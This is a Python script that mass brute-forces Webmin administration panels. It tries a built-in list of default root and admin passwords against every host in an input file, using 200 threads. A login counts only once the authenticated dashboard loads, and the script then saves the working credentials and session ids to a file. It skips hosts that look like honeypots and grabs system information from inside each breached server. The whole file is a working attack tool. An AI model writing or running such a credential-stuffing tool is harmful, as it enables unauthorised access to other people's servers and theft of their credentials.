#!/usr/bin/env python3
"""Webmin credential sweep with PROOF-GATED hits.

Hit is only recorded when, after login, GET / returns the authenticated
dashboard (not the login form). 302 + sid alone is NOT proof.

Writes an owner-scoped result file with full host config on every hit.
"""
import sys, re, json, time, threading, os
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests, urllib3
urllib3.disable_warnings()

T = 12
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36"}
DASH = ("webmin_logout", "system-status", "index.cgi?x=", "Webmin version", "client_name")

USERS = ["root", "admin"]
PASSWORDS = [
    "root", "password", "admin", "123456", "12345678", "123456789", "12345", "1234",
    "admin123", "qwerty", "abc123", "111111", "000000", "toor", "webmin", "virtualmin",
    "changeme", "default", "test123", "letmein", "welcome", "master", "P@ssw0rd",
    "Password1", "password1", "root123", "administrator", "server", "linux", "vps",
    "ubnt", "student", "guest", "demo", "secret", "123qwe", "qwerty123", "passw0rd",
    "admin@123", "Admin123", "Password@123", "1qaz2wsx", "zaq12wsx",
]
CREDS = [(u, p) for u in USERS for p in PASSWORDS]

def mk():
    s = requests.Session(); s.verify = False; s.headers.update(UA); return s

def is_dash(html, cookies):
    if not cookies.get("sid"):
        return False
    t = html or ""
    if 'name="pass"' in t and "session_login" in t:
        return False
    return any(x in t for x in DASH)

def probe_host(host):
    base = "https://" + host
    out = {"host": host}
    s = mk()
    try:
        g = s.get(base + "/", timeout=T, allow_redirects=False)
    except Exception:
        return None
    srv = g.headers.get("Server") or ""
    if "miniserv" not in srv.lower():
        return None                      # honeypot / not webmin
    out["server"] = srv[:30]
    mod = "bundle.min.css" in (g.text or "")
    out["modern"] = mod
    try:
        s.get(base + "/session_login.cgi", timeout=T)
    except Exception:
        pass
    for u, pw in CREDS:
        try:
            p = s.post(base + "/session_login.cgi",
                       data={"user": u, "pass": pw, "save": "1"},
                       headers={"Referer": base + "/session_login.cgi",
                                "Content-Type": "application/x-www-form-urlencoded"},
                       timeout=T, allow_redirects=False)
        except Exception:
            return out
        if p.status_code not in (302, 303) or not s.cookies.get("sid"):
            continue
        # candidate -> prove it
        try:
            d = s.get(base + "/", timeout=T, allow_redirects=True)
        except Exception:
            continue
        if is_dash(d.text, s.cookies):
            out.update({"user": u, "pw": pw, "PROVEN": True,
                        "sid": s.cookies.get("sid"),
                        "title": (re.search(r"<title[^>]*>([^<]{0,50})", d.text or "", re.I) or [None, None])[1]})
            # config snapshot while we are inside
            try:
                bio = s.get(base + "/sysinfo/", timeout=T)
                out["sysinfo_code"] = bio.status_code
            except Exception:
                pass
            return out
    out["tried"] = len(CREDS)
    return out

def main():
    path = sys.argv[1]
    hosts = [l.strip() for l in open(path) if l.strip()]
    lock = threading.Lock()
    hits, done = [], 0
    t0 = time.time()
    outf = "/tmp/wm_brute_hits.json"
    result = []
    def flush():
        json.dump(result, open(outf, "w"), indent=1)
    with ThreadPoolExecutor(max_workers=200) as ex:
        futs = {ex.submit(probe_host, h): h for h in hosts}
        for f in as_completed(futs):
            done += 1
            try:
                r = f.result()
            except Exception:
                r = None
            if r:
                with lock:
                    result.append(r)
                if r.get("PROVEN"):
                    with lock:
                        hits.append(r)
                        flush()
                    print(f"🔥 {r['host']} {r['user']}:{r['pw']} {r.get('server')} {r.get('title')}", flush=True)
            if done % 250 == 0:
                print(f"  .. {done}/{len(hosts)} proven={len(hits)} {time.time()-t0:.0f}s", flush=True)
    flush()
    print(f"\nDONE n={len(hosts)} PROVEN={len(hits)} in {time.time()-t0:.0f}s", flush=True)

if __name__ == "__main__":
    main()
